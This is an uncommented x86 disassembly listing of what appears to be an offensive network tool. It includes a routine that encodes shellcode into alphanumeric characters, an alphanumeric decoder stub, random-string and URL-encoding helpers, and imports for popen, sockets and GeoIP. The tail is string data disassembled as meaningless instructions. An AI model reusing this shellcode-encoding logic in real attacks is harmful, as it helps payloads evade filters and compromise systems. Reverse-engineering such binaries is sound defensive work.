lea eax, [esi + 1]
push eax
call dbg.xmalloc
add esp, 0xc
push esi
push edi
mov ebx, eax
push eax
call sym.imp.memcpy
mov byte [ebx + esi], 0
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov edx, 0xffffffff
xor eax, eax
mov edi, dword [buf]
cld
mov ecx, edx
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
mov edi, dword [str]
mov ecx, edx
repne scasb al, byte es:[edi]
not ecx
lea edi, [ecx - 1]
xor eax, eax
cmp ebx, edi
jb 0x804d35d
mov eax, ebx
sub eax, edi
cmp eax, 0
mov dword [l], 0
jbe 0x804d35b
mov dword [var_14h], eax
mov esi, esi
xor esi, esi
cmp esi, edi
jae 0x804d34c
mov ebx, dword [buf]
add ebx, dword [l]
jmp 0x804d328
mov esi, esi
movsx eax, dl
add eax, 0x20
cmp ecx, eax
jne 0x804d34c
inc esi
inc ebx
cmp esi, edi
jae 0x804d34c
mov al, byte [ebx]
movsx ecx, al
sub eax, 0x41
cmp al, 0x19
ja 0x804d337
add ecx, 0x20
mov eax, dword [str]
mov dl, byte [eax + esi]
lea eax, [edx - 0x41]
cmp al, 0x19
jbe 0x804d318
movsx eax, dl
cmp ecx, eax
je 0x804d322
nop
cmp esi, edi
je 0x804d365
inc dword [l]
mov eax, dword [l]
cmp dword [var_14h], eax
ja 0x804d308
xor eax, eax
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [buf]
add eax, dword [l]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov ebx, dword [arg_ch]
mov eax, dword [ebx]
mov dword [sc_len], eax
lea eax, [eax + eax + 0x1d]
mov dword [ebx], eax
push eax
mov dword [z], 0
call dbg.xmalloc
mov esi, 0x804f069
cld
mov ecx, 7
mov edi, eax
dec dword [ebx]
mov dword [encShellcode], eax
rep movsd dword es:[edi], dword ptr [esi]
movsb byte es:[edi], byte ptr [esi]
mov edx, dword [sc_len]
add esp, 0x10
cmp dword [z], edx
jge 0x804cf80
lea ecx, [buff]
mov dword [s], ecx
mov esi, esi
mov edx, dword [shellcode]
mov ecx, dword [z]
movzx eax, byte [edx + ecx]
mov ebx, eax
mov esi, eax
call sym.imp.rand
mov edx, eax
cld
xor eax, eax
mov ecx, 0xffffffff
mov edi, str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov eax, edx
xor edx, edx
div ecx
movsx eax, byte [edx + str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
and esi, 0xf
and eax, 0xf
shr ebx, 4
cmp eax, esi
je 0x804ced5
mov ecx, 0xffffffff
mov edi, str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
xor eax, eax
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov esi, esi
inc edx
mov eax, edx
xor edx, edx
div ecx
movsx eax, byte [edx + str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
and eax, 0xf
cmp eax, esi
jne 0x804cec0
mov al, byte [edx + str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
sar al, 4
movsx eax, al
xor ebx, eax
mov dword [E], eax
call sym.imp.rand
mov edx, eax
cld
xor eax, eax
mov ecx, 0xffffffff
mov edi, str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov eax, edx
xor edx, edx
div ecx
movsx eax, byte [edx + str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
and eax, 0xf
cmp eax, ebx
je 0x804cf39
mov ecx, 0xffffffff
mov edi, str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
xor eax, eax
repne scasb al, byte es:[edi]
not ecx
dec ecx
inc edx
mov eax, edx
xor edx, edx
div ecx
movsx eax, byte [edx + str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
and eax, 0xf
cmp eax, ebx
jne 0x804cf24
shl dword [E], 4
movsx eax, byte [edx + str.0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
mov edx, dword [E]
add edx, esi
and eax, 0xfffffff0
push edx
add eax, ebx
push eax
push str._c_c
push dword [s]
call sym.imp.sprintf
pop eax
pop edx
lea edx, [buff]
push edx
push dword [encShellcode]
mov dword [s], edx
call sym.imp.strcat
inc dword [z]
mov eax, dword [sc_len]
add esp, 0x10
cmp dword [z], eax
jl 0x804ce6c
mov eax, dword [encShellcode]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov edi, dword [arg_8h]
test edi, edi
je 0x804d9bc
test dword [flags], 0x800
je 0x804d9b0
test dword [flags], 0x2000
jne 0x804da53
test dword [flags], 0x800
jne 0x804da3c
mov dword [buf], obj.static_buf.2
lea ebx, [edi + 1]
push eax
push ebx
push 0
push dword [buf]
call sym.imp.memset
mov dword [i], 0
add esp, 0x10
cmp dword [i], edi
jae 0x804d9a4
mov esi, dword [buf]
jmp 0x804d932
lea esi, [esi]
test dword [flags], 0x4000
jne 0x804d9d8
inc dword [i]
inc esi
cmp dword [i], edi
jae 0x804d9a4
call sym.imp.rand
push eax
fild dword [esp]
fnstcw word [ebp - 0xe]
mov ax, word [var_eh]
fmul dword [0x804ee8c]
mov ah, 0xc
fmul dword [0x804ee90]
mov word [var_10h], ax
add esp, 4
fldcw word [ebp - 0x10]
fistp dword [ebp - 0x14]
fldcw word [ebp - 0xe]
test dword [flags], 0x8000
mov ebx, dword [var_14h]
je 0x804d91c
call sym.imp.rand
mov edx, 3
mov ecx, edx
cdq
idiv ecx
test edx, edx
jne 0x804da1c
mov eax, dword [i]
test eax, eax
je 0x804da06
mov edx, 9
mov eax, ebx
mov ecx, edx
cdq
idiv ecx
add edx, 0x30
mov byte [esi], dl
inc dword [i]
inc esi
cmp dword [i], edi
jb 0x804d932
mov eax, dword [buf]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
nop
cmp edi, 0x3ff
jbe 0x804d8d1
push dword [flags]
push edi
push str.strrand__u___08x_
push 6
call dbg.seterror
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
mov esi, esi
call sym.imp.rand
mov edx, eax
shr edx, 0x1f
lea edx, [eax + edx]
and edx, 0xfffffffe
sub eax, edx
je 0x804da28
cmp eax, 1
jne 0x804d929
mov eax, ebx
mov ecx, 0x19
cdq
idiv ecx
add edx, 0x41
mov byte [esi], dl
jmp 0x804d99b
call sym.imp.rand
mov edx, eax
shr edx, 0x1f
lea edx, [eax + edx]
and edx, 0xfffffffe
sub eax, edx
lea edx, [eax + 1]
nop
cmp edx, 1
je 0x804da28
jle 0x804da64
cmp edx, 2
jmp 0x804d9ef
mov eax, ebx
mov ecx, 0x19
cdq
idiv ecx
add edx, 0x61
mov byte [esi], dl
jmp 0x804d99b
sub esp, 0xc
lea ebx, [edi + 1]
push ebx
call dbg.xmalloc
add esp, 0x10
mov dword [buf], eax
jmp 0x804d8f5
call sym.imp.rand
xor edx, edx
div edi
lea edi, [edx + 1]
jmp 0x804d8de
test edx, edx
je 0x804d98a
jmp 0x804d929
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [buf]
xor esi, esi
test ebx, ebx
mov byte [hex], 0x30
mov byte [var_27h], 0x31
mov byte [var_26h], 0x32
mov byte [var_25h], 0x33
mov byte [var_24h], 0x34
mov byte [var_23h], 0x35
mov byte [var_22h], 0x36
mov byte [var_21h], 0x37
mov byte [var_20h], 0x38
mov byte [var_1fh], 0x39
mov byte [var_1eh], 0x61
mov byte [var_1dh], 0x62
mov byte [var_1ch], 0x63
mov byte [var_1bh], 0x64
mov byte [var_1ah], 0x65
mov byte [var_19h], 0x66
je 0x804dcef
cld
xor eax, eax
mov edi, dword [buf]
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
mov ebx, ecx
sub esp, 0xc
not ebx
lea eax, [ebx - 1]
push ebx
mov dword [buflen], eax
call dbg.xmalloc
add esp, 0xc
push ebx
push 0
push eax
mov edi, eax
call sym.imp.memset
xor edx, edx
add esp, 0x10
cmp esi, dword [buflen]
jae 0x804dc7c
mov esi, esi
mov ecx, dword [buf]
mov al, byte [ecx + edx]
cmp al, 0x25
je 0x804dc94
cmp al, 0x2b
je 0x804dc86
mov byte [esi + edi], al
inc edx
inc esi
cmp edx, dword [buflen]
jb 0x804dc64
mov eax, edi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov byte [esi + edi], 0x20
inc edx
inc esi
cmp edx, dword [buflen]
jmp 0x804dc7a
lea esi, [esi]
lea ecx, [edx + 2]
mov dword [var_30h], ecx
mov ecx, dword [buflen]
cmp dword [var_30h], ecx
jae 0x804dc72
mov byte [edi + esi], 0
mov eax, dword [buf]
xor ebx, ebx
lea ecx, [edx + eax + 1]
mov dl, byte [ecx]
lea eax, [edx - 0x41]
cmp al, 0x19
ja 0x804dcbb
add edx, 0x20
xor eax, eax
lea esi, [esi]
cmp byte [ebp + eax - 0x28], dl
je 0x804dcdd
inc eax
cmp eax, 0xf
jbe 0x804dcc0
inc ebx
inc ecx
cmp ebx, 1
jbe 0x804dcaf
mov edx, dword [var_30h]
inc edx
inc esi
cmp edx, dword [buflen]
jmp 0x804dc7a
or al, byte [edi + esi]
test ebx, ebx
jne 0x804dcea
movsx eax, al
shl eax, 4
mov byte [edi + esi], al
jmp 0x804dccc
push ecx
push 0
push str.urldecode__p_
push 6
call dbg.seterror
xor eax, eax
jmp 0x804dc7e
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [obj.last_errstr]
test eax, eax
mov dword [obj.last_errno], 0
jne 0x804a970
leave
ret
nop
sub esp, 0xc
push eax
call sym.imp.free
mov dword [obj.last_errstr], 0
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [obj.fd]
test eax, eax
jle 0x804a2ef
sub esp, 0xc
push eax
call sym.imp.close
add esp, 0x10
mov dword [obj.fd], 0xffffffff
leave
ret
push ebp
mov ebp, esp
push ebx
push eax
mov dl, byte [arg_10h]
mov eax, dword [arg_8h]
mov byte [new_chr], dl
mov dl, byte [eax]
test dl, dl
mov bl, byte [arg_ch]
mov ecx, eax
je 0x804d4df
lea esi, [esi]
cmp dl, bl
je 0x804d4e4
inc ecx
mov dl, byte [ecx]
test dl, dl
jne 0x804d4d4
pop ebx
pop ebx
leave
ret
nop
mov dl, byte [new_chr]
mov byte [ecx], dl
inc ecx
mov dl, byte [ecx]
jmp 0x804d4db
push ebp
mov ebp, esp
push edi
sub esp, 8
cld
xor eax, eax
mov edi, obj.ret.0_1
mov ecx, 0x10
rep stosd dword es:[edi], eax
push dword [num]
push dword [format]
push obj.ret.0_1
call sym.imp.sprintf
mov eax, obj.ret.0_1
mov edi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push eax
mov edx, dword [arg_8h]
test edx, edx
je 0x804de7a
mov edi, edx
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
sub esp, 8
dec ecx
push ecx
push edx
call dbg.urlencoden
mov edi, dword [var_4h]
leave
ret
push edi
push 0
push str.urlencode__p_
push 6
call dbg.seterror
xor eax, eax
mov edi, dword [var_4h]
leave
ret
jmp dword [reloc.popen]
jmp dword [reloc.vsprintf]
jmp dword [reloc.random]
jmp dword [reloc.recv]
jmp dword [reloc.pclose]
jmp dword [reloc.atol]
jmp dword [reloc.getenv]
jmp dword [reloc.GeoIP_delete]
jmp dword [reloc.strtoul]
jmp dword [reloc.select]
jmp dword [reloc.fflush]
jmp dword [reloc.strrchr]
jmp dword [reloc.write]
jmp dword [reloc.fprintf]
jmp dword [reloc.strcat]
jmp dword [reloc.setsockopt]
jmp dword [reloc.fseek]
jmp dword [reloc.strstr]
jmp dword [reloc.read]
jmp dword [reloc.___runetype]
jmp dword [reloc.sscanf]
jmp dword [reloc.fread]
jmp dword [reloc.fopen]
jmp dword [reloc._init_tls]
jmp dword [reloc.ftell]
jmp dword [reloc.srand]
jmp dword [reloc.fclose]
jmp dword [reloc.time]
jmp dword [reloc.GeoIP_new]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.atexit]
jmp dword [reloc.fputc]
jmp dword [reloc.fwrite]
jmp dword [reloc.atoi]
jmp dword [reloc.GeoIP_country_id_by_addr]
jmp dword [reloc.open]
pop ecx
jmp str.IIIIIIIIIIIIIIIII7
call fcn.0804f06b
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
dec ecx
aaa
add byte [0x632563], ah
and eax, 0x632563
and eax, 0x30257525
xor al, 0x78
add byte [eax], dh
xor byte [ecx], dh
xor dh, byte [ebx]
xor al, 0x35
aaa
cmp byte [ecx], bh
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
popal
bound esp, qword [ebx + 0x64]
push 0x6a69
imul ebp, dword [ebp + ebp*2 + 0x6e], 0x6f
jo 0x804f139
jb 0x804f13d
je 0x804f141
jbe 0x804f145
js 0x804f149
jp 0x804f0d2
add byte [eax], al
and eax, 0x25753f73
push 0x255f7568
push 0x255f7568
jne 0x804f144
and eax, 0x5f756868
and eax, 0x255f756c
jne 0x804f150
and eax, 0x75255f75
add byte [ebx + 0x6f], al
inc ebx
outsd dx, dword [esi]
outsb dx, byte [esi]
je 0x804f161
outsb dx, byte [esi]
je 0x804f12c
push esp
jns 0x804f172
cmp ah, byte gs:[eax]
add byte [ebx + 0x6f], al
inc ebx
outsd dx, dword [esi]
outsb dx, byte [esi]
je 0x804f170
outsb dx, byte [esi]
je 0x804f13b
dec esp
outsb dx, byte gs:[esi]
je 0x804f17c
cmp ah, byte [eax]
and eax, 0x73000a64
jae 0x804f190
jb 0x804f18c
outsb dx, byte [esi]
outsd dx, dword [esi]
jae 0x804f191
popal
arpl word [ebp + 0x73], sp
sub byte [0x78002970], ah
js 0x804f19f
je 0x804f1a0
jb 0x804f193
jne 0x804f1a1
jne 0x804f1a1
sub byte [0x73002970], ah
jae 0x804f1ac
jb 0x804f1ac
jb 0x804f19c
outsb dx, byte [esi]
sub byte fs:[0x25202c75], ah
sub byte [0x25202c75], ah
and byte [0x29783830], ah
xor byte [eax], bh
cmp byte [eax + 0x29], bh
js 0x804f170
add byte [eax + 0x73], bh
js 0x804f1bd
jae 0x804f1bf
jb 0x804f1bb
outsb dx, byte [esi]
jne 0x804f1c0
sub byte [0x25202c70], ah
sub dword fs:[eax], eax
jne 0x804f1cd
insb byte es:[edi], dx
arpl word gs:[edi + 0x64], bp
sub byte gs:[0x75002970], ah
jne 0x804f1db
insb byte es:[edi], dx
outsb dx, byte gs:[esi]
arpl word [edi + 0x64], bp
outsb dx, byte gs:[esi]
outsb dx, byte [esi]
sub byte [0x25202c70], ah
and eax, 0x25202c70
sub dword fs:[eax], eax
jne 0x804f1ee
insb byte es:[edi], dx
outsb dx, byte gs:[esi]
arpl word [edi + 0x64], bp
sub byte gs:[0x45002970], ah
inc ebp
js 0x804f1fb
imul esi, dword [edx + 0x65], 0x4d203a73
cmp ah, byte [eax]
dec ebp
outsd dx, dword [esi]
outsb dx, byte [esi]
sub al, 0x20
xor dh, byte [esi]
and byte [edx + 0x75], cl
insb byte es:[edi], dx
and byte [ecx], dh
cmp dword [ecx], edi
aaa
and byte [eax], dh
xor eax, 0x3a30303a
xor byte [eax], dh
and byte [edi + 0x4d], al
inc edi
dec ebp
push esp
or al, byte [ebx + 0x61]
arpl word [eax + 0x65], bp
sub eax, 0x746e6f43
jb 0x804f22a
insb byte es:[edi], dx
cmp ah, byte [eax]
jo 0x804f22f
outsd dx, dword [esi]
jae 0x804f236
sub eax, 0x63656863
imul edi, dword [0x70202c30], 0x72
jb 0x804f234
sub eax, 0x63656863
imul edi, dword [0x72500a30], 0x61
xor byte [edx], cl
push eax
jb 0x804f23c
insd dword es:[di], dx
popal
cmp ah, byte [eax]
outsb dx, byte [esi]
outsd dx, dword [esi]
sub eax, 0x68636163
or ah, byte gs:[0x25732573]
jae 0x804f215
jae 0x804f1f2
add byte [eax], al
jb 0x804f269
outsd dx, dword [esi]
jb 0x804f234
and byte [edi + 0x75], ch
outsd dx, dword [esi]
jne 0x804f272
and byte [edi + 0x66], ch
outsd dx, dword [esi]
and byte [ebp + 0x65], ch
insd dword es:[edi], dx
outsd dx, dword [esi]
jb 0x804f281
and byte [ecx + 0x6e], ch
and byte [esi + 0x75], ah
outsb dx, byte [esi]
arpl word [ecx + ebp*2 + 0x6f], si
outsb dx, byte [esi]
and byte [eax + 0x73], bh
js 0x804f28a
je 0x804f28b
jne 0x804f28c
sub byte [0x212970], ah
sub dword [ecx], esp
add byte [eax], al
add byte [ebp + 0x72], ah
jb 0x804f299
outsd dx, dword [esi]
jb 0x804f264
and byte [edi + 0x75], ch
je 0x804f24f
outsd dx, dword [esi]
and byte [ebp + 0x65], ch
insd dword es:[edi], dx
outsd dx, dword [esi]
jb 0x804f2b1
and byte [ecx + 0x6e], ch
and byte [esi + 0x75], ah
jne 0x804f2ad
arpl word [ecx + ebp*2 + 0x6f], si
outsb dx, byte [esi]
and byte [eax + 0x6d], bh
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [eax], bp
and eax, 0x212964
sub dword [ecx], esp
add byte [eax], al
add byte [ebp + 0x72], ah
jb 0x804f2c9
outsd dx, dword [esi]
jb 0x804f294
and byte [edi + 0x75], ch
je 0x804f27f
outsd dx, dword [esi]
and byte [ebp + 0x65], ch
insd dword es:[edi], dx
outsd dx, dword [esi]
jb 0x804f2e1
and byte [ecx + 0x6e], ch
imul ebp, dword [esi + 0x20], 0x636e7566
je 0x804f2db
outsd dx, dword [esi]
outsb dx, byte [esi]
and byte [eax + 0x72], bh
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [eax], bp
and eax, 0x25202c70
jo 0x804f2ad
and byte [0x212964], ah
add byte [ebp + 0x72], ah
jb 0x804f2fd
jb 0x804f2fb
outsd dx, dword [esi]
jb 0x804f2c8
and byte [edi + 0x75], ch
je 0x804f2b3
outsd dx, dword [esi]
and byte [ebp + 0x65], ch
insd dword es:[edi], dx
outsd dx, dword [esi]
jb 0x804f315
and byte [ecx + 0x6e], ch
and byte [esi + 0x75], ah
outsb dx, byte [esi]
arpl word [ecx + ebp*2 + 0x6f], si
outsb dx, byte [esi]
and byte [eax + 0x63], bh
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [eax], bp
and eax, 0x25202c64
sub al, 0x20
and eax, 0x212964
and al, 0x46
jb 0x804f323
inc edx
push ebx
inc esp
cmp ah, byte [eax]
jae 0x804f338
arpl word [edi], bp
das
insb byte es:[edi], dx
imul esp, dword [edx + 0x2f], 0x2f757363
imul esi, dword [ebx], 0x652d3638
insb byte es:[edi], dx
das
arpl word [edx + 0x74], si
je 0x804f34b
push ebx
sub al, 0x76
and byte [ecx], dh
and byte ss:[edx], dh
xor byte [eax], dh
xor eax, 0x2f35302f
xor dword [ecx], edi
and byte [eax], dh
aaa
cmp dh, byte [ebx]
xor dword [edx], edi
xor byte [esi], dh
and byte [esi + 0x72], ah
jb 0x804f31e
and byte [ebp + 0x78], al
inc ebp
js 0x804f371
and byte [eax + eax], ah
and al, 0
